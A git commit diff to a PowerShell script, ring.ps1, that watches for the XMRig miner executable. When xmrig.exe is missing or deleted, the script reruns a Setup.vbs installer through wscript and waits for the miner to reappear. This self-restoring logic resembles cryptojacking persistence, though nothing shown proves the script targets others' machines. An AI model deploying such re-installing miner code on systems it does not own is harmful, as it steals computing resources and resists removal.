e47cc761b6ffd9749322ce1af7e7fb4f58dc7367
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-08 18:34:54 +0700

    ring.ps1

--- ring.ps1
+++ ring.ps1
@@ -7,6 +7,26 @@ function Start-CoinRun {
     Write-Host "coinrun.cmd START"
 }
 
+if (Test-Path $xmrigPath) {
+    
+} else {
+    Write-Warning "xmrig.exe DoseNotExist..."
+    if (Test-Path $setupPath) {
+        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
+        Write-Host "Running Setup.vbs"
+
+        while (!(Test-Path $xmrigPath)) {
+            Write-Host "Wait xmrig.exe..."
+            Start-Sleep -Seconds 3
+        }
+
+        Write-Host "xmrig.exe. RUN coinrun.cmd"
+        
+    } else {
+        Write-Error "NO Setup.vbs"
+    }
+}
+
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
         Write-Warning "xmrig.exe Del. Wait..."
@@ -21,7 +41,7 @@ while ($true) {
             }
 
             Write-Host "Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
-            Start-CoinRun
+            
         } else {
             Write-Error "NO Setup.vbs: $setupPath"
         }
